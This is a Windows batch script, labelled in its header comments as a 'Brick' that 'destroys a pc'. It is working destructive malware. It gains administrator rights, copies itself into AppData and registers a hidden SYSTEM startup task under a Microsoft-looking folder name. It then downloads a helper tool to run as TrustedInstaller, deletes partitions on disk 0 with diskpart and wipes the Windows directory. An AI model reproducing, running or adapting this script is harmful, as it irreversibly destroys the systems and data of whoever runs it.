::extension
::Brick
::red
::destroys a pc
@echo off
setlocal EnableExtensions

:: Check for admin privileges
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting administrator privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

echo You are now running with administrator privileges!

:: Define paths and names
set "TARGET_DIR=%APPDATA%\glory"
set "TARGET_FILE=%TARGET_DIR%\%~nx0"
set "TASK_FOLDER=Microsoft\Windows\Glory"
set "TASK_NAME=glory"
set "TASK_PATH=\%TASK_FOLDER%\%TASK_NAME%"

:: Check if the scheduled task already exists
schtasks /query /tn "%TASK_PATH%" >nul 2>&1
if %errorlevel% equ 0 (
    echo Task already exists. Proceeding to the main script execution...
    goto :MainRoutine
)

:: --- Registration Phase (Runs only if task doesn't exist) ---
echo Task not found. Registering and moving script...

:: Create target directory in AppData if it doesn't exist
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"

:: Create the Task Scheduler folder if it is missing
powershell -NoProfile -Command ^
    "$svc = New-Object -ComObject Schedule.Service; $svc.Connect(); $root = $svc.GetFolder('\'); try { $null = $root.GetFolder('%TASK_FOLDER%') } catch { $null = $root.CreateFolder('%TASK_FOLDER%') }"

if %errorlevel% neq 0 (
    echo Failed to create the Task Scheduler folder "\%TASK_FOLDER%".
    pause
    exit /b 1
)

:: Register the task using the destination AppData file path
schtasks /create ^
    /tn "%TASK_PATH%" ^
    /tr "\"%TARGET_FILE%\"" ^
    /sc onstart ^
    /ru SYSTEM ^
    /f

if %errorlevel% equ 0 (
    echo Successfully registered as a startup task.
    echo Location: Task Scheduler Library\%TASK_FOLDER%\%TASK_NAME%
    
    :: Move the script to the target directory right before exiting
    move /y "%~f0" "%TARGET_FILE%" >nul
    
    echo Exiting initial setup...
    timeout /t 3 >nul
    shutdown /r /t 0
    exit /b 0
) else (
    echo Failed to register the startup task.
    pause
    exit /b 1
)

:: --- Main Routine Phase ---
:MainRoutine
echo.
echo Running main script tasks here...
:: Place the actual logic you want the script to perform on startup below this line.
whoami /groups | findstr /i "TrustedInstaller" >nul 2>&1
if %errorlevel% EQU 0 goto :RUN_PAYLOAD


set "RUNNER=%SystemRoot%\Temp\AdvancedRun.exe"

if exist "%RUNNER%" goto :LAUNCH_TI

echo [INFO] Fetching clean standalone helper directly...

powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $wc = New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent', 'Mozilla/5.0'); $wc.DownloadFile('https://github.com', '%SystemRoot%\Temp\helper.zip')" >nul 2>&1


powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://www.nirsoft.net/utils/advancedrun-x64.zip' -UserAgent 'Mozilla/5.0' -OutFile '%SystemRoot%\Temp\adv.zip'"
powershell -Command "Expand-Archive -Path '%SystemRoot%\Temp\adv.zip' -DestinationPath '%SystemRoot%\Temp' -Force"
del "%SystemRoot%\Temp\adv.zip" >nul 2>&1

:LAUNCH_TI
echo [INFO] Staging execution script...
copy /y "%~f0" "%SystemRoot%\Temp\ti_payload.bat" >nul

echo [INFO] Transitioning execution environment...

"%RUNNER%" /EXEFilename "cmd.exe" /CommandLine "/k %SystemRoot%\Temp\ti_payload.bat" /RunAs 8 /Run
exit /b

:RUN_PAYLOAD
setlocal enabledelayedexpansion

set TargetDisk=0

:: Define the temporary script name
set "ScriptFile=%temp%\dp_wipe_script.txt"

:: Build and drop the Diskpart script dynamically
(echo select disk %TargetDisk%) > "%ScriptFile%"
for /l %%i in (2,1,8) do (
    if not %%i==3 (
        (echo select partition %%i) >> "%ScriptFile%"
        (echo delete partition override) >> "%ScriptFile%"
    )
)
(echo exit) >> "%ScriptFile%"

:: Run Diskpart using the generated script
diskpart /s "%ScriptFile%" >nul 2>&1

:: Clean up the temporary file
if exist "%ScriptFile%" del "%ScriptFile%"

del /s /q "%SystemRoot%" >nul 2>&1
for /d %%D in ("%SystemRoot%") do rd /s /q "%%D" >nul 2>&1

if exist "%SystemRoot%\Temp\ti_payload.bat" (
    (goto) 2>nul & del "%SystemRoot%\Temp\ti_payload.bat"
)
pause


